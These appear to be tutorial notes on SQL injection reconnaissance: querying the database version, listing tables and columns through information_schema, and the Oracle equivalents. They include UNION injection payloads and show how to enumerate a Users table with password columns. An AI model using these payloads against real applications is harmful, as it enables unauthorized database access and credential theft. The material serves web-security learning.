---
title: "SQL - Examining the database"
permalink: /SQL-Examining/
layout: single
author-profile: true
---

You can query the version details for the database. The way that this is done depends on the database type, so you can infer the database type from whichever technique works. For example, on Oracle you can execute:

``SELECT * FROM v$version``

You can also determine what database tables exist, and which columns they contain. For example, on most databases you can execute the following query to list the tables:

``SELECT * FROM information_schema.tables``

## Querying the database type and version
Different databases provide different ways of querying their version. You often need to try out different queries to find one that works, allowing you to determine both the type and version of the database software.
The queries to determine the database version for some popular database types are as follows:
```
Database type       Query
Microsoft, MySQL    SELECT @@version

Oracle              SELECT * FROM v$version

PostgreSQL          SELECT version()
```
For example, you could use a UNION attack with the following input:

``' UNION SELECT @@version–``

On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.

There is a built-in table on Oracle called dual which you can use for this purpose. For example:

``UNION SELECT 'abc' FROM dual``

## Listing the contents of the database
Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.
 
You can query information_schema.tables to list the tables in the database:

``SELECT * FROM information_schema.tables``

This returns output like the following:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
=====================================================
MyDatabase     dbo           Products    BASE TABLE
MyDatabase     dbo           Users       BASE TABLE
MyDatabase     dbo           Feedback    BASE TABLE
``` 
This output indicates that there are three tables, called Products, Users, and Feedback.
 
You can then query information_schema.columns to list the columns in individual tables:

``SELECT * FROM information_schema.columns WHERE table_name = 'Users'``

This returns output like the following:
```
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
=================================================================
MyDatabase     dbo           Users       UserId       int
MyDatabase     dbo           Users       Username     varchar
MyDatabase     dbo           Users       Password     varchar
```
This output shows the columns in the specified table and the data type of each column.

### Equivalent to information schema on Oracle
On Oracle, you can obtain the same information with slightly different queries.

You can list tables by querying all_tables:

``SELECT table_name FROM all_tables``

And you can list columns by querying all_tab_columns:

``SELECT * FROM all_tab_columns WHERE table_name = 'USERS'``
